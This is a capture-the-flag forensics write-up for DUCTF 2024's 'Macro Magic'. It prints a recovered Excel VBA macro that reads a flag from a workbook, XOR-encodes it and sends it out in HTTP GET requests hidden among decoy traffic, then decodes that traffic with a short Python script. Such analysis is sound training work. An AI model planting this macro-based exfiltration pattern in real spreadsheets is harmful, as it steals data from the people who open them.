# Macro Magic
Solved by **warlocksmurf**
Full writeup is available at https://warlocksmurf.github.io/posts/ductf2024/#macro-magic-forensics

## Question
We managed to pull this excel spreadsheet artifact from one of our Outpost machines. It’s got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag!

## Solution
We analysed the PCAP and XLSM files. From the XSLM file, there was a macro with the following text:
```
Attribute VB_Name = "Module1"

Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function

Public Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function

Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function

Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long
    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing (J)
    J = "http://flag.com/"
    superThing (J)
    G = "key"
    J = "http://play.duc.tf/"
    superThing (J)
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing (J)
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing (J)
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing (J)
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    
End Sub

Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function

Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function

Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function

Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```

The explanations for each function:

- anotherThing() - This function basically just performs XOR on two strings.
- importantThing() - This function generates random numbers and sorts them.
- totalyFine() - This function modifies a string by replacing spaces with hyphens.
- superThing() - This function sends a GET request and returns the response.
- something() - This function converts each character of a string to its binary representation.
- forensics() - This function converts a string to its byte representation with spaces.

After analysed it further, the XOR key was `MonkeyMagic`. Using that, we decode the URLs that can be identified from the PCAP file.
```
def decode(encoded, key):
    decoded = ""
    key_len = len(key)
    for i in range(len(encoded)):
        decoded += chr(encoded[i] ^ ord(key[(i) % key_len]))
    return decoded

flag = [11, 3, 15, 12, 95, 89, 9, 52, 36, 61, 37, 54, 34, 90, 15, 86, 38, 26, 80, 19, 1, 60, 12, 38, 49, 9, 28, 38, 0, 81, 9, 2, 80, 52, 28, 19]
key = "MonkeyMagic"

decoded_message = decode(flag, key)
print(decoded_message)
```

### Flag
`DUCTF{M4d3_W1th_AI_by_M0nk3ys}`
